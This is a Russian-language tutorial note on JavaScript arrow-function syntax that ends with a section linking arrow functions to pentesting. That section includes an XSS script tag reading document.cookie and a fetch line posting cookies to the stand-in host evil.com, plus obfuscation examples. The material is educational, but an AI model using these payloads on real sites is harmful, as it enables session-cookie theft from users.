
# JS: Стрелочные функции, основы

## 📌 Что это

**Стрелочная функция** (arrow function) — короткий синтаксис создания функций через `=>`.

```js
let func = (arg1, arg2) => expression;
```

Это **сокращённая версия** Function Expression:

```js
let func = function(arg1, arg2) {
    return expression;
};
```

---

## 🔧 Синтаксис

### Два и более аргумента — скобки обязательны:

```js
let sum = (a, b) => a + b;

console.log(sum(1, 2));   // 3
```

### Один аргумент — скобки можно опустить:

```js
let double = n => n * 2;

console.log(double(3));   // 6
```

### Нет аргументов — пустые скобки обязательны:

```js
let sayHi = () => console.log("Hello!");

sayHi();   // Hello!
```

⚠️ **Без скобок нельзя:** `let f = => alert(1);` — SyntaxError.

---

## 📏 Две формы стрелочных функций

### Форма 1 — **без фигурных скобок** (одно выражение):

```js
let sum = (a, b) => a + b;
```

- `=> expression` — вычисляется и **возвращается автоматически**.
- `return` **не нужен**.
- Только **одно** выражение.

### Форма 2 — **с фигурными скобками** (многострочная):

```js
let sum = (a, b) => {
    let result = a + b;
    return result;      // ← return ОБЯЗАТЕЛЕН
};
```

- `=> { body }` — тело из **нескольких инструкций**.
- `return` **обязателен** для возврата значения.
- Если забыть `return` → функция вернёт `undefined`.

---

## 📊 Сравнение форм

| Форма | Синтаксис | `return` | Когда использовать |
|-------|-----------|----------|-------------------|
| Без скобок | `a => a + 1` | Не нужен | Однострочные |
| С фигурными скобками | `a => { return a + 1; }` | **Обязателен** | Многострочные |

---

## 🎯 Использование как Function Expression

Стрелочные функции — **такие же значения**, как и обычные:

```js
let age = prompt("Возраст?", 18);

let welcome = (age < 18) ?
    () => alert('Привет!') :
    () => alert("Здравствуйте!");

welcome();
```

**Работает** там же, где Function Expression:
- Колбэки.
- Динамическое создание.
- Присваивание переменной.

## 🎯 Связь с пентестом

- **Короткие payload'ы** — стрелочные функции короче:
  ```js
  <script>let f=()=>alert(document.cookie);f()</script>
  ```
- **Колбэки в `fetch`** — стрелочная запись короче:
  ```js
  fetch('https://evil.com', {method:'POST', body:document.cookie})
  ```
- **`setTimeout`/`setInterval`** — часто со стрелкой:
  ```js
  setTimeout(() => alert(1), 1000);
  ```
- **IIFE через стрелку** — реже, но встречается:
  ```js
  (() => alert(1))();
  ```
- **Обфускация** — короткая запись труднее читается:
  ```js
  (a=>a)(alert)(1)
  ```
- **`this` в стрелочных функциях** — ведёт себя **иначе** (лексический `this`). Это важно для обхода sandbox'ов и понимания чужого кода (тема будет дальше).

---

## ⚠️ Что важно запомнить

1. **`()` для 0 и 2+ аргументов**, можно опустить для 1.
2. **Без `{}` — `return` не нужен** (автовозврат).
3. **С `{}` — `return` обязателен**.
4. Стрелочные функции — **значения**, как Function Expression.
5. **`this` ведёт себя по-другому** — тема продвинутая, вернёмся позже.
